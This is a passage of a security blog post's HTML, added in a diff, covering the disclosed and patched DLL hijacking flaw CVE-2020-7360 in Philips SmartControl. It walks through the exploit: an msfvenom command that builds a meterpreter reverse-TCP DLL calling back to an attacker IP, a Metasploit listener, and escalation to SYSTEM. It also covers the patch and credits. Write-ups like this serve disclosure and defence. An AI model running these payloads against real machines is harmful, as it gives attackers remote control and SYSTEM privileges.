+<li><code>-o</code> – The name of the output file. This should be identical to one of the DLL files that was identified as an uncontrolled search path element.</li>
+</ul>
+<p>I was only able to exploit the uncontrolled search path elements in SmartControl using x86 (32-	bit) payloads. So assuming that I want to target <code>MtxApi.dll</code> and that the IP of my Kali Linux 	machine is <code>192.168.13.37</code>, I may create my payload like this:<br>
+<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.13.37 LPORT=1337 -f dll -o MtxApi.dll</code></p>
+</li>
+</ul>
+<ul>
+<li>
+<p>Use msfconsole to start a listener</p>
+<ul>
+<li>Launch the Metasploit console: <code>msfconsole</code></li>
+<li>Choose the multi/handler module: <code>use exploit/multi/handler</code></li>
+<li>Set the <code>payload</code>, <code>LHOST</code>, and <code>LPORT</code> values to match those selected with msfvenom</li>
+<li>Start the listener in the background: <code>run -j</code></li>
+</ul>
+<p>If you entered all the values correctly, it should go similar to the example in Image 5</p>
+</li>
+</ul>
+<!--kg-card-end: markdown--><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.vonahi.io/content/images/2020/08/msfconsole_listener.png" class="kg-image" alt srcset="https://blog.vonahi.io/content/images/size/w600/2020/08/msfconsole_listener.png 600w, https://blog.vonahi.io/content/images/2020/08/msfconsole_listener.png 790w" sizes="(min-width: 720px) 720px"><figcaption><i>Image 5: Starting a listener in Metasploit</i></figcaption></figure><!--kg-card-begin: markdown--><ul>
+<li>Copy the payload to one of the vulnerable locations on the target machine. If you are running Metasploit from a virtual machine (like I was), you could probably drag and drop the file from the file explorer. Alternatively, you could set up a shared folder for the VM, or launch a simple web server from the Metasploit machine and download the file via your browser on the Windows machine.1 In my case, I first established a meterpreter shell with limited privileges on the target machine (to imitate a real-world attack). To deliver the payload, I simply used the meterpreter <code>upload</code> command.</li>
+<li>(Re)start the vulnerable application in order to trigger the payload. In the case of SmartControl, it was not possible for me to (re)start the application from my initial shell with limited privileges. This means that in a real-world scenario, an attacker could write the payload to the target system and start a listener, but they would then have to wait for a user to run the application. The attacker may of course use social engineering to try and trick a user into running SmartControl, but user interaction is always required for the attack to work.</li>
+<li>Check your listener and verify the privileges of the incoming connection.
+<ul>
+<li>Check the user id for the meterpreter session: <code>getuid</code></li>
+<li>Drop into a shell: <code>shell</code></li>
+<li>Check your privileges: <code>whoami /priv</code></li>
+<li>Exit the shell: <code>exit</code></li>
+<li>Try to get SYSTEM privileges: <code>getsytem</code></li>
+<li>Check the user id again to verify you are now NT AUTHORITY\SYSTEM: <code>getuid</code></li>
+</ul>
+</li>
+</ul>
+<p>Note: If you are testing this on Windows 10 with a standard Metasploit payload, you will need to disable Windows Security and/or your antivirus solution to prevent your payload from being detected.</p>
+<!--kg-card-end: markdown--><h3 id="demo-video">Demo video</h3><p>The video below demonstrates the full attack.</p><figure class="kg-card kg-embed-card kg-card-hascaption"><iframe width="612" height="344" src="https://www.youtube.com/embed/cxXYH77f28A?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><figcaption>Philips SmartControl DLL hijacking (CVE-2020-7360) demo video</figcaption></figure><h3 id="the-patch">The patch</h3><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7360">CVE-2020-7360</a> was patched in April with the release of SmartControl version 1.0.7, which is available at the following locations:</p><ul><li>English: <a href="https://www.philips.co.uk/c-p/248E9QHSB_00/curved-lcd-monitor-with-ultra-wide-color/support">https://www.philips.co.uk/c-p/248E9QHSB_00/curved-lcd-monitor-with-ultra-wide-color/support</a> </li><li>German: <a href="https://www.philips.de/c-p/248E9QHSB_00/geschwungener-lcd-monitor-mit-ultra-wide-color/support">https://www.philips.de/c-p/248E9QHSB_00/geschwungener-lcd-monitor-mit-ultra-wide-color/support</a> </li><li>French: <a href="https://www.philips.fr/c-p/248E9QHSB_00/moniteur-lcd-incurve-avec-ultra-wide-color/aide">https://www.philips.fr/c-p/248E9QHSB_00/moniteur-lcd-incurve-avec-ultra-wide-color/aide</a> </li></ul><p>This update fixes the vulnerability by no longer requiring SmartControl to run with administrator privileges. The updated version still tries to load several DLL files that are not present on Windows 10 by default. However, because SmartControl now runs with limited privileges, this issue can no longer be exploited to achieve privilege escalation.</p><h3 id="acknowledgments">Acknowledgments</h3><ul><li>A massive shout-out to <a href="https://twitter.com/todb">Tod Beardsley</a> from Rapid7 for helping me coordinate the disclosure and reserving the CVE for me.</li><li>I also want to thank <a href="https://twitter.com/altonjx">Alton</a> and <a href="https://twitter.com/portslug">Drake</a> for supporting and inspiring me on my infosec journey, and <a href="https://twitter.com/trammie">Trammie</a> for the stunning image she designed for this post.</li><li>Finally, none of this would have been possible without the folks at Philips who relayed this report to the licensee company that develops, manufactures and sells Philips-branded computer monitor products. The licensee has corrected the vulnerability via a worldwide software update.</li></ul><hr><p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>About Vonahi Security</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong><br>Vonahi Security is building the future of offensive cybersecurity consulting services through automation. We provide the world's first and only automated network penetration test platform that replicates full attack simulations with zero configuration. With over 30 years of combined industry experience in both offensive and defensive security operations, our team of certified consultants have experience working with a significant number of organizations, industries, networks, and technologies. Our service expertise includes Penetration Testing and Adversary Simulations. Vonahi Security is headquartered in Atlanta, GA. To learn more, visit <a href="https://www.vonahi.io/">www.vonahi.io</a></p><p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>Stay Informed</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><ul><li>Connect with us on <a href="https://www.linkedin.com/company/vonahisec/">Linkedin</a> for Professional Security Tips</li><li>Like us on <a href="https://www.facebook.com/vonahisec/">Facebook</a> for Personal Security Tips</li><li>Follow us on <a href="https://twitter.com/vonahisec">Twitter</a> for News &amp; Threat Updates</li></ul>
+                </div>
+            </section>
+
+
+            <footer class="post-full-footer">
+
+
+                    
+<section class="author-card">
+        <img class="author-profile-image" src="/content/images/size/w100/2020/08/cat_laptop.jpg" alt="Erik Wynter" />
+    <section class="author-card-content">
+        <h4 class="author-card-name"><a href="/author/wynter/">Erik Wynter</a></h4>
+            <p>Erik Wynter is a junior pentester, Metasploit contributor and script kitty.</p>
+    </section>
+</section>
+<div class="post-full-footer-right">
+    <a class="author-card-button" href="/author/wynter/">Read More</a>
+</div>
+
+
+            </footer>
+
+
+        </article>
+
+    </div>
+</main>
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+                <article class="read-next-card"
+                            style="background-image: url(/content/images/size/w600/2019/02/vonahi_blog_banner-1.png)"
+                >
+                    <header class="read-next-card-header">
+                        <small class="read-next-card-header-sitetitle">&mdash; Vonahi Security&#x27;s Blog &mdash;</small>
+                        <h3 class="read-next-card-header-title"><a href="/tag/research/">research</a></h3>
+                    </header>
+                    <div class="read-next-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
+</div>
+                    <div class="read-next-card-content">
+                        <ul>
+                            <li><a href="/whats-in-a-re-name/">What’s in a (re)name: RCE Hunting in CMSs via Unrestricted File Upload</a></li>
+                            <li><a href="/2019-year-in-review/">2019/2020: A Few Cybersecurity Reflections and Predictions</a></li>
+                            <li><a href="/13-freaky-infosec-facts/">13 Freaky Infosec Facts</a></li>
+                        </ul>
+                    </div>
+                    <footer class="read-next-card-footer">
+                        <a href="/tag/research/">See all 8 posts →</a>
+                    </footer>
+                </article>
+
+                <article class="post-card post tag-research tag-vulnerabilities tag-penetration-testing ">
+
+    <a class="post-card-image-link" href="/whats-in-a-re-name/">
+        <img class="post-card-image"
+            srcset="/content/images/size/w300/2020/11/blog-image-nov9.jpg 300w,
+                    /content/images/size/w600/2020/11/blog-image-nov9.jpg 600w,
+                    /content/images/size/w1000/2020/11/blog-image-nov9.jpg 1000w,
+                    /content/images/size/w2000/2020/11/blog-image-nov9.jpg 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            src="/content/images/size/w600/2020/11/blog-image-nov9.jpg"
+            alt="What’s in a (re)name: RCE Hunting in CMSs via Unrestricted File Upload"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/whats-in-a-re-name/">
+
+            <header class="post-card-header">
+                    <span class="post-card-tags">research</span>
+                <h2 class="post-card-title">What’s in a (re)name: RCE Hunting in CMSs via Unrestricted File Upload</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                <p>Earlier this year, our threat researcher found three easily exploitable vulnerabilities in CMS apps, including two that could result in remote code execution (RCE). This article combines write-ups for these vulnerabilities.</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+
+            <ul class="author-list">
+                <li class="author-list-item">
+
+                    <div class="author-name-tooltip">
+                        Erik Wynter
+                    </div>
+
+                        <a href="/author/wynter/" class="static-avatar">
+                            <img class="author-profile-image" src="/content/images/size/w100/2020/08/cat_laptop.jpg" alt="Erik Wynter" />
+                        </a>
+                </li>
+            </ul>
+
+            <span class="reading-time">11 min read</span>
+
+        </footer>
+
+    </div>
+
+</article>
+
+                <article class="post-card post tag-penetration-testing ">
+
+    <a class="post-card-image-link" href="/avoiding-smb-rate-limits-during-password-attacks/">
+        <img class="post-card-image"
+            srcset="/content/images/size/w300/2020/02/password-1.png 300w,
+                    /content/images/size/w600/2020/02/password-1.png 600w,
+                    /content/images/size/w1000/2020/02/password-1.png 1000w,
+                    /content/images/size/w2000/2020/02/password-1.png 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            src="/content/images/size/w600/2020/02/password-1.png"
+            alt="Avoiding SMB Rate Limits During Authentication Attacks"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/avoiding-smb-rate-limits-during-password-attacks/">
+
+            <header class="post-card-header">
+                    <span class="post-card-tags">penetration testing</span>
+                <h2 class="post-card-title">Avoiding SMB Rate Limits During Authentication Attacks</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                <p>Here's a quick workaround for when you get rate limited during a password attack against the SMB service.</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+
+            <ul class="author-list">
+                <li class="author-list-item">
+
+                    <div class="author-name-tooltip">
+                        Alton Johnson
+                    </div>
+
+                        <a href="/author/alton/" class="static-avatar">
+                            <img class="author-profile-image" src="/content/images/size/w100/2019/06/alton-2.jpg" alt="Alton Johnson" />
+                        </a>
+                </li>
+            </ul>
+
+            <span class="reading-time">5 min read</span>
+
+        </footer>
+
+    </div>
+
+</article>
+
+        </div>
+    </div>
+</aside>
+
+<div class="floating-header">
+    <div class="floating-header-logo">
+        <a href="https://blog.vonahi.io">
+                <img src="/content/images/size/w30/2019/02/VONAHI.ico" alt="Vonahi Security&#x27;s Blog icon" />
+            <span>Vonahi Security&#x27;s Blog</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">&mdash;</span>
+    <div class="floating-header-title">When the PATH to SYSTEM is wide open: Philips SmartControl DLL hijacking (CVE-2020-7360)</div>
+    <div class="floating-header-share">
+        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
+</svg>
+</div>
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=When%20the%20PATH%20to%20SYSTEM%20is%20wide%20open%3A%20Philips%20SmartControl%20DLL%20hijacking%20(CVE-2020-7360)&amp;url=https://blog.vonahi.io/when-the-path-to-system-is-wide-open/"
+            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+        </a>
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.vonahi.io/when-the-path-to-system-is-wide-open/"
+            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
+        </a>
+    </div>
+    <progress id="reading-progress" class="progress" value="0">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+
+
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://blog.vonahi.io">Vonahi Security&#x27;s Blog</a> &copy; 2021</section>
+                <nav class="site-footer-nav">
+                    <a href="https://blog.vonahi.io">Latest Posts</a>
+                    <a href="https://www.facebook.com/vonahisec" target="_blank" rel="noopener">Facebook</a>
+                    <a href="https://twitter.com/vonahisec" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://www.linkedin.com/company/vonahisec" target="_blank" rel="noopener">LinkedIn</a>
+                    <a href="https://www.github.com/vonahisec" target="_blank" rel="noopener">GitHub</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+
+    <script>
+        var images = document.querySelectorAll('.kg-gallery-image img');
+        images.forEach(function (image) {
+            var container = image.closest('.kg-gallery-image');
+            var width = image.attributes.width.value;
+            var height = image.attributes.height.value;
+            var ratio = width / height;
+            container.style.flex = ratio + ' 1 0%';
+        })
+    </script>
+
+
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/built/jquery.fitvids.js?v=d44c73ced9"></script>
+
+
+    <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('#reading-progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+
+});
+</script>
+
+
+    
+
+</body>
+</html>
